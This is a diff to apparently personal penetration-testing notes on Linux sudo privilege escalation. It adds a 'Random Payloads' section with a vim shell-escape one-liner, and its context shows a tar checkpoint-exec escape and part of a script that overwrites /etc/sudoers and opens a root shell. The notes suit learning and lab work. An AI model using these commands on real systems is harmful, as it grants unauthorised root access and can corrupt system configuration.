@@ -23,6 +23,8 @@ $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/
 ```
 
 ➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) (0.2k ⭐) for offline browsing.
+
+➡️ You may need/want to create a [root bash](rootbash.md).
 </div></div>
 
 <hr class="sep-both">
@@ -78,7 +80,7 @@ It's quite easy to do it manually, but you need two machines (ex: your VM and th
 ⚠️ The script may mess with your [sudoers](/operating-systems/linux/env/files/index.md#etcsudoers) file if something goes wrong. I destroyed my VM 7 times before managing to make the script work 🌳. If you understand the commands used in the script, use them one by one, and check the tampered sudoers file (output) BEFORE overriding the current one.
 </div><div>
 
-```bash
+```bash!
 file=/etc/sudoers
 port=4444
 # todo: use mktemp
@@ -104,4 +106,22 @@ sudo wget -q localhost:$port/$output -O $file && kill $pid
 # open the root shell
 sudo bash
 ```
+</div></div>
+
+<hr class="sep-both">
+
+## Random Payloads
+
+<div class="row row-cols-lg-2"><div>
+
+If we are allowed to run a command as sudo:
+
+* VIM
+
+```ps
+$ sudo vim -c ':!/bin/sh'
+```
+</div><div>
+
+...
 </div></div>
